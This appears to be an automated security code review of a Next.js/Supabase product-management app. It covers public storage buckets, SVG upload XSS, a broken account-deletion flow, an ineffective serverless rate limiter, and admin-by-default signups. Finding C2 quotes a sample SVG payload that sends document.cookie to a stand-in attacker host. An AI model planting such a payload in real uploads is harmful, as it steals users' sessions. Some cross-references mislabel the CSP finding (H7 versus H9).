# Code Review: housemoney-pm

**Reviewed:** 2026-04-08
**Stack:** Next.js 14 (App Router) · tRPC v11 · Prisma 7 · PostgreSQL (Supabase) · Zustand · Tailwind CSS
**Reviewer:** Claude (automated)

---

## 1. Executive Summary

housemoney-pm is a well-structured product-management SaaS with a thoughtful technology stack and good instincts around security. The tRPC/Prisma/Supabase combination is used competently: workspace-scoped RBAC is applied consistently, SQL injection is avoided via parameterised queries, the GitHub webhook uses HMAC verification, and an audit log exists for key actions. The codebase is readable and organised by feature. However, several security issues require attention before production use: uploaded files go into publicly-readable storage buckets (no auth required to read them), SVG uploads are permitted (stored XSS vector), the account-deletion flow has a silent FK-constraint bug that prevents users from deleting their accounts, and the in-memory rate limiter is ineffective on Vercel's serverless architecture. Testing gaps are significant — the upload route, AI endpoints, invitation flow, and agent engine have no test coverage.

---

## 2. Critical Issues

### C1 — Files uploaded to public storage buckets (unauthenticated read access)
**File:** `src/app/api/upload/route.ts:40`
**What:** Supabase storage buckets are created with `{ public: true }`. Every uploaded file — task attachments, document files, DOCX/XLSX/PDF exports — is immediately accessible to anyone on the internet with the URL.
**Why it matters:** A PM platform contains confidential internal documents, meeting notes, and planning files. Public bucket URLs follow a predictable pattern (`<supabase-url>/storage/v1/object/public/<bucket>/<user-id>/<timestamp>_<filename>`). There is no access control layer between the URL and the file.
**Fix:** Create buckets with `public: false`. Generate time-limited signed URLs via `supabase.storage.from(bucket).createSignedUrl(path, 3600)` when serving files to authenticated users.

---

### C2 — SVG uploads allowed: stored XSS vector
**File:** `src/app/api/upload/route.ts:53`
**What:** `image/svg+xml` is in the ALLOWED_MIME_TYPES set. SVG files can embed `<script>` tags and event handlers (e.g. `<svg onload="fetch('https://attacker.com/?c='+document.cookie)">`). When any user opens a public bucket URL for an SVG, the browser executes the script in the context of the Supabase storage origin.
**Why it matters:** Combines with C1 to allow a user to upload a malicious SVG that runs JavaScript in any browser that fetches the URL. Even if buckets become private (fixing C1), signed URLs would still serve the SVG in the same origin context.
**Fix:** Remove `image/svg+xml` from ALLOWED_MIME_TYPES. If SVG support is required, sanitise with DOMPurify server-side before upload (the `isomorphic-dompurify` dependency is already installed).

---

### C3 — `deleteAccount` fails silently for most real users (FK constraint bug)
**File:** `src/server/trpc/routers/workspace.ts:216`
**What:** The transaction in `deleteAccount` only cleans up a subset of user-owned records before deleting the user row. Missing:
- `DocumentComment` (authorId — no cascade)
- `FeedbackComment` (authorId — no cascade)
- `ExperimentComment` (authorId — no cascade)
- `DocumentAttachment` (uploadedById — no cascade)
- `TaskAttachment` (uploadedById — no cascade)
- `Document` (authorId — no cascade)
- `Feedback` (createdById — no cascade)
- `Experiment` (createdById — no cascade)
- `Decision` (createdById — no cascade)

Any user who has created a document, written a doc/feedback/experiment comment, or uploaded a file attachment will hit a FK constraint violation. The transaction rolls back, `supabase.auth.admin.deleteUser` is never called, and the user is still authenticated. This is a silent failure — the API returns a 500 with no explanation.
**Why it matters:** GDPR Article 17 "right to erasure" compliance is undermined. Users who attempt to delete their accounts cannot do so.
**Fix:** Add `deleteMany` for all the above tables before deleting the user. Alternatively, add `onDelete: SetNull` (for nullable FKs) or `onDelete: Cascade` in the Prisma schema where appropriate.

---

### C4 — Upload authentication uses `getSession()` instead of `getUser()`
**File:** `src/app/api/upload/route.ts:14`
**What:** `supabaseAuth.auth.getSession()` reads the JWT from the cookie but **does not verify it with the Supabase server**. Per Supabase's own documentation: "On the server, always use `getUser()` — `getSession()` cannot be trusted for server-side authentication."
**Why it matters:** A crafted or replayed JWT could pass the `if (!session)` check even if the session has been revoked server-side, allowing unauthenticated file uploads.
**Fix:** Replace `supabaseAuth.auth.getSession()` with `supabaseAuth.auth.getUser()` and check `data.user` instead of `data.session`.

---

## 3. High Priority

### H1 — In-memory rate limiter is ineffective on serverless (Vercel)
**File:** `src/lib/rate-limit.ts`
**What:** The comment at line 3 explicitly acknowledges the limiter only works on single-instance deployments. On Vercel, each incoming request may land on a different Lambda instance with its own empty `windows` Map. The 20 req/min AI limit and the 10 upload/min limit are therefore completely bypassed on production.
**Why it matters:** No cost protection on Anthropic API calls; automated abuse can generate unlimited AI requests or uploads.
**Fix:** Replace with [Upstash Redis](https://upstash.com/) rate limiting (the comment even suggests it). The `@upstash/ratelimit` package provides a drop-in `slidingWindow` implementation with the same interface.

---

### H2 — MIME type validation trusts client-supplied Content-Type header
**File:** `src/app/api/upload/route.ts:62`
**What:** The whitelist check is `ALLOWED_MIME_TYPES.has(file.type)` where `file.type` comes from the multipart form's Content-Type — a value the client sets. An attacker can upload a file containing HTML or executable code with `Content-Type: image/jpeg` and it will pass the filter and be stored.
**Why it matters:** While the risk is somewhat mitigated by C1 (if buckets become private), server-side MIME sniffing is best practice. Path traversal or polyglot files could also be a concern.
**Fix:** Read the first few bytes of the file and compare against known magic bytes. The `file-type` npm package handles this and is lightweight.

---

### H3 — `tasks.get` fetches full task data before authorization check
**File:** `src/server/trpc/routers/tasks.ts:217`
**What:** The `get` procedure fetches the task and all its relations (comments, activities, attachments, subtasks, PRs) at line 217, then checks workspace membership at line 256. An authenticated user from a different workspace can probe for task existence by task ID and get a `NOT_FOUND` vs a data-returning response before the `FORBIDDEN` is thrown.
**Why it matters:** Although the data is not returned to the attacker (the auth check throws before return), the execution order is wasteful and the pattern could lead to accidental data leaks if the check is ever refactored or skipped.
**Fix:** Restructure to load workspace membership first (from a minimal task `select: { workspaceId: true }`), then authorize, then fetch the full task.

---

### H4 — `queryKnowledge` AI endpoint ignores guest project scoping
**File:** `src/server/ai/knowledge-query.ts:67` and `src/server/trpc/routers/ai.ts:207`
**What:** The `findRelevantChunks` function in `knowledge-query.ts` queries all documents for a `workspaceId` without filtering by project access. When called from `ai.queryKnowledge`, there is no guest project filter applied. A guest who has access to only Project A can ask a question and receive AI answers synthesised from documents in Projects B, C, and D.
**Why it matters:** Guest access controls are carefully applied in the documents and tasks routers but are absent here, creating an information-disclosure path via the AI chat interface.
**Fix:** Pass `accessibleIds` (from `getAccessibleProjectIds`) into `findRelevantChunks` as an optional parameter and add the project filter to the SQL queries when it is non-null.

---

### H5 — Private project members cannot see their own projects in the list
**File:** `src/server/trpc/routers/projects.ts:28`
**What:** The `projects.list` query for MEMBER role filters by `OR: [{ isPrivate: false }, { createdById: ctx.userId }]`. It does not include the case where a user has an explicit `ProjectMember` record for a private project. However, `requireProjectAccess` (called from tasks, documents, etc.) *does* check `ProjectMember` and grants access. The result: a member explicitly added to a private project cannot see it in the sidebar/project list, but can still access tasks within it if they know the project ID.
**Why it matters:** This is a functional bug. Users who are invited into private projects get a broken experience: the project does not appear in their project list.
**Fix:** Add `ProjectMember` to the membership check: `OR: [{ isPrivate: false }, { createdById: ctx.userId }, { members: { some: { userId: ctx.userId } } }]`.

---

### H6 — `send-invite-email.ts` interpolates user-controlled HTML without escaping
**File:** `src/server/invitations/send-invite-email.ts:33`
**What:** `buildInviteHtml` directly interpolates `inviterName` and `workspaceName` into the HTML template string. A workspace named `<b>Click me</b>` or a user named `" onmouseover="...` would inject raw HTML into the email.
**Why it matters:** HTML injection in email, while less severe than browser XSS, can be used for phishing (injected links, spoofed content). `inviterName` originates from `authUser.user_metadata?.name`, which is user-supplied at signup.
**Fix:** Escape HTML special characters (`<`, `>`, `"`, `&`, `'`) in all user-supplied values before interpolating into the template.

---

### H7 — Every new user is automatically granted ADMIN role on the shared workspace

**Files:** `src/server/trpc/trpc.ts:77–92`, `src/app/api/auth/callback/route.ts:56–71`

**What it is:**
When any user signs up or logs in via OAuth for the first time, both the tRPC `createContext` and the OAuth callback unconditionally assign them `ADMIN` on the shared workspace:

```typescript
// src/server/trpc/trpc.ts:83-89
const workspace = await db.workspace.upsert({
  where: { slug: 'house-money' },
  update: {},
  create: { name: 'House Money', slug: 'house-money' },
});
await db.workspaceMember.create({
  data: { workspaceId: workspace.id, userId: newUser.id, role: 'ADMIN' }, // ← always ADMIN
});
```

**Why it matters:**
In any deployment with open signups or where multiple employees can create accounts, every new user immediately gains workspace ADMIN privileges. An ADMIN can: read the full audit log (including all user emails and IP addresses), remove other members, send invitations on behalf of the organisation, and view all projects and tasks. A new team member, contractor, or attacker who creates an account gets the same access as the workspace owner.

**Suggested fix:**
Grant `ADMIN` only to the first user on a new workspace; subsequent users should default to `MEMBER`:

```typescript
const memberCount = await db.workspaceMember.count({ where: { workspaceId: workspace.id } });
await db.workspaceMember.create({
  data: { workspaceId: workspace.id, userId: newUser.id, role: memberCount === 0 ? 'ADMIN' : 'MEMBER' },
});
```

---

### H8 — Missing `Strict-Transport-Security` (HSTS) header

**File:** `next.config.mjs:12–30`

**What it is:**
The response headers config sets X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and CSP — but omits `Strict-Transport-Security`.

**Why it matters:**
Without HSTS, browsers do not enforce HTTPS on subsequent visits. On an untrusted network (airport WiFi, shared office router), an attacker performing SSL-stripping can intercept the initial HTTP request before a redirect to HTTPS occurs, capturing session cookies unencrypted.

**Suggested fix:**
Add to the headers array in `next.config.mjs`:
```javascript
{ key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
```

---

### H9 — CSP `script-src` includes `'unsafe-eval'` and `'unsafe-inline'`
**File:** `next.config.mjs:23`
**What:** The Content-Security-Policy header sets `script-src 'self' 'unsafe-eval' 'unsafe-inline'`. Both directives nullify XSS protection from CSP.
**Why it matters:** The CSP security headers exist but provide no protection against XSS attacks as configured.
**Fix:** Next.js App Router requires a nonce-based CSP. Implement nonces via middleware (Next.js docs provide a pattern), then remove `unsafe-eval` and `unsafe-inline`. `'unsafe-eval'` is only needed for legacy eval-dependent code; audit whether it is actually required.

---

## 4. Medium Priority

### M1 — Activity records inserted serially inside a loop
**File:** `src/server/trpc/routers/tasks.ts:333`
**What:** For each changed field on `tasks.update`, the code does `await ctx.db.activity.create(...)` in a `for` loop. Updating a task with 5 changed fields produces 5 sequential round trips.
**Fix:** Replace with `ctx.db.activity.createMany({ data: activities.map(...) })`.

---

### M2 — `projects.list` loads all task statuses into memory for progress calculation
**File:** `src/server/trpc/routers/projects.ts:38`
**What:** `tasks: { select: { status: true } }` loads every task record for every project just to compute a percentage. For a workspace with 20 projects and 500 tasks each, this is 10,000 task records in memory.
**Fix:** Use a SQL aggregate instead:
```ts
_count: { select: { tasks: true } },
// plus a separate count for DONE tasks
```
Or use a raw `GROUP BY` query, or apply Prisma's `where` inside the include to count only done tasks: `tasks: { where: { status: 'DONE' }, select: { id: true } }` paired with `_count: { select: { tasks: true } }`.

---

### M3 — Invitation token uses CUID (not cryptographically random)
**File:** `prisma/schema.prisma:530`
**What:** `token String @unique @default(cuid())`. CUIDs incorporate a timestamp and a machine fingerprint — they are not cryptographically unpredictable. Invitation links with guessable tokens could allow uninvited users to join a workspace.
**Fix:** Change the default to a cryptographically random value. `nanoid` (already a dependency) is appropriate: `@default(dbgenerated("encode(gen_random_bytes(24), 'hex')"))` at the DB level, or generate the token in application code with `import { nanoid } from 'nanoid'; token: nanoid(32)`.

---

### M4 — `deleteAccount` calls Supabase after the DB transaction
**File:** `src/server/trpc/routers/workspace.ts:232`
**What:** The Prisma transaction (which deletes the user row) succeeds first, then `supabase.auth.admin.deleteUser(ctx.userId)` is called. If this call fails (network timeout, Supabase error), the Prisma user is gone but the Supabase auth record remains. On next login, `createContext()` auto-recreates the Prisma user and workspace membership — the user is resurrected.
**Fix:** Delete the Supabase auth user inside the transaction or, more robustly, call Supabase first and only run the Prisma transaction if that succeeds.

---

### M5 — `createContext()` silently swallows all errors as unauthenticated
**File:** `src/server/trpc/trpc.ts:90`
**What:** The outer `catch` on line 90 returns `{ db, user: null, userId: null }` for any error. A DB connection failure, a crash inside the user-autocreation block, or an unexpected Supabase error all silently present as "unauthenticated" and get rejected by `protectedProcedure` with a 401.
**Why it matters:** Makes debugging production issues very difficult — a 401 wave could actually be hiding a DB connection problem.
**Fix:** Narrow the catch to auth-specific errors (e.g., `null` authUser), and rethrow or surface unexpected errors as 500s.

---

### M6 — `CRON_SECRET` missing from `.env.example`
**File:** `.env.example`
**What:** The cron route (`src/app/api/cron/agent/route.ts`) requires `CRON_SECRET` to be set, but it is absent from `.env.example`. New developers setting up the project won't know to set it, and `!process.env.CRON_SECRET` causes the entire cron endpoint to return 401 for every request (including Vercel's own scheduler).
**Fix:** Add `CRON_SECRET=your-cron-secret` to `.env.example`.

---

### M7 — Analytics `summary` query: `projectId` not validated against workspace
**File:** `src/server/trpc/routers/analytics.ts:27`
**What:** A `projectId` is passed directly into the Prisma query without verifying it belongs to `workspaceId`. A member could pass a project ID from a different workspace and receive task counts for it.
**Fix:** Add `await requireProjectAccess(ctx.db, input.projectId, ctx.userId)` when `input.projectId` is provided, or add `workspaceId` to the project filter.

---

### M8 — `comment.body` has no maximum length
**File:** `src/server/trpc/routers/comments.ts:37`
**What:** `body: z.string().min(1)` — no upper bound. A user can submit arbitrarily large comment bodies, storing megabytes of text per comment.
**Fix:** Add a reasonable max, e.g. `z.string().min(1).max(50000)`. Apply similar caps to other unbounded text fields (task description, doc content, feedback description).

---

### M9 — `xlsx` package at v0.18.5 has known vulnerabilities
**File:** `package.json:61`
**What:** The `xlsx` (SheetJS) package at v0.18.5 has documented prototype pollution vulnerabilities. The package's open-source development was abandoned; active development moved to a commercial version.
**Fix:** Evaluate replacing with `exceljs` or `@SheetJS/xlsx` (commercial). At minimum, run `npm audit` and review any advisories for the current version.

---

## 5. Strengths

**Workspace-scoped RBAC is comprehensive and consistent.** The `requireWorkspaceMember`, `requireWorkspaceAdmin`, `requireNonGuest`, and `getAccessibleProjectIds` helpers are used correctly throughout all tRPC routers. Guest isolation is applied at every data access point (tasks, projects, documents, comments, search). This is the most security-critical aspect of a multi-tenant platform and it is handled well.

**GitHub webhook uses timing-safe HMAC verification.** `src/app/api/github/webhook/route.ts` uses `crypto.timingSafeEqual` to prevent timing attacks on signature comparison. The repo allowlist feature is present. This is textbook secure webhook handling.

**SQL injection is not possible.** All raw SQL in the search and analytics routers uses Prisma's tagged template literals (`Prisma.sql`, `Prisma.join`, `Prisma.empty`), which parameterise all values. No string concatenation into SQL is present.

**Security headers are present.** `next.config.mjs` sets X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and a Content-Security-Policy. The CSP needs tightening (H7) but the infrastructure is there.

**Invitation flow is solid.** Tokens are validated for expiry, matched to the correct email, prevent duplicate memberships, and include an audit log entry. The acceptance flow works for both existing and new users.

**Atomic task ID generation.** Using a `$transaction` to increment `workspace.taskCounter` and create the task prevents duplicate identifiers under concurrent requests.

**Rate limiting on AI endpoints is the right idea.** Even though the implementation needs to move to Redis (H1), applying rate limits to both the upload route and AI calls shows cost-awareness.

**Meaningful test coverage for utilities and UI.** Unit tests for avatar colours, label chips, priority indicators, status badges, and timeline utilities provide a regression safety net. The vitest setup with jsdom and test helpers is well-configured.

**E2E tests cover the critical user paths.** Playwright tests for auth, task CRUD, board view, command palette, and keyboard shortcuts validate the most-used features end-to-end.

**Audit logging exists and is used.** Account creation, password resets, member removal, and invitation events are all recorded with user and workspace context.

**Good separation of concerns.** The server layer (`/server/`) is cleanly separated from the client (`/components/`, `/lib/`). AI analyzers are isolated into individual files. tRPC routers are per-domain. Zustand stores handle only UI state. This is maintainable architecture.

---

## 6. Recommended Next Steps

Prioritised action list:

1. **[Security] Fix storage bucket visibility (C1)** — Change bucket creation to `public: false` and switch to signed URL generation. This is the most impactful security fix.

2. **[Security] Remove SVG from upload whitelist (C2)** — One-line fix; high XSS risk.

3. **[Security] Fix `deleteAccount` FK constraint bug (C3)** — Add the missing `deleteMany` calls so users can actually delete their accounts.

4. **[Security] Replace `getSession()` with `getUser()` in upload route (C4)** — One-line fix for correct server-side auth verification.

5. **[Security] Fix guest scoping in `queryKnowledge` (H4)** — Pass accessible project IDs into `findRelevantChunks`.

6. **[Security] Fix private project visibility bug (H5)** — Members added to private projects can't see them in the project list.

7. **[Infra] Replace in-memory rate limiter with Redis (H1)** — Required for rate limiting to work on Vercel. Add `UPSTASH_REDIS_REST_URL` and `UPSTASH_REDIS_REST_TOKEN` to env config.

8. **[Security] Escape HTML in invite email template (H6)** — Sanitise `inviterName` and `workspaceName` before interpolation.

9. **[Security] Harden invitation token generation (M3)** — Replace CUID with `nanoid(32)` for cryptographic unpredictability.

10. **[Bug] Fix `deleteAccount` transaction order (M4)** — Delete Supabase auth user before the Prisma transaction.

11. **[Ops] Add `CRON_SECRET` to `.env.example` (M6)** — Without this, the daily AI agent never runs.

12. **[Performance] Replace serial activity inserts with `createMany` (M1)** — Low effort, measurable improvement on task updates.

13. **[Performance] Fix `projects.list` N+1 task load (M2)** — Use aggregate queries instead of loading all task records.

14. **[Security] Tighten CSP to remove `unsafe-eval`/`unsafe-inline` (H7)** — Requires implementing nonce-based CSP in Next.js middleware.

15. **[Tests] Add coverage for upload route, invitation flow, AI endpoints** — These are the highest-value gaps given their security surface area.

16. **[Dependency] Audit/replace `xlsx` package (M9)** — Run `npm audit`; evaluate `exceljs` as a replacement.

17. **[README] Replace the create-next-app boilerplate README** — The current README contains no project-specific setup instructions. Add: environment variable documentation, local development setup, database migration steps, Supabase configuration notes, GitHub webhook setup, and the `CRON_SECRET` requirement.
